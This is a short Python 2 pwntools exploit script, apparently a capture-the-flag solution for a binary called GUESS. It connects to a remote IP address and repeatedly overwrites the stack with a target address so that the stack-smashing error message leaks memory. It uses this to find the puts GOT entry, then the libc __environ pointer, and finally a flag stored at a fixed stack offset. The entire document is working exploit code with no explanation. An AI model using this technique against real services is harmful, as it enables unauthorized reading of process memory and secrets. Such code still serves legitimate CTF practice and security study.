from pwn import *
from LibcSearcher import LibcSearcher

# p = process("./GUESS")
p = remote("106.75.90.160" , 9999)
elf = ELF("./GUESS")
# context.log_level = "debug"
p.recv()

def leak(target_addr):
	payload = p64(target_addr) * (0x130 / 8)
	p.sendline(payload)
	p.recvuntil("***: ")
	return u64(p.recvuntil("\x7f").ljust(8 , "\x00"))

puts_addr = leak(elf.got["puts"])
libc = LibcSearcher("puts" , puts_addr)
offset_environ = libc.dump("__environ")
offset_puts = libc.dump("puts")
environ_addr = puts_addr - offset_puts + offset_environ

print "%s:%s" % ("environ" , hex(environ_addr)) 

content_addr = leak(environ_addr)
print hex(content_addr)
print "____"
# environ -> content_addr
# content_addr on stack , distance content_addr flag_addr 360byte
flag_addr = content_addr - 360
# gdb.attach(p , "b *0x0000000000400B9C ")
p.recv()
payload = p64(flag_addr) * (0x130 / 8)
p.sendline(payload)

print p.interactive()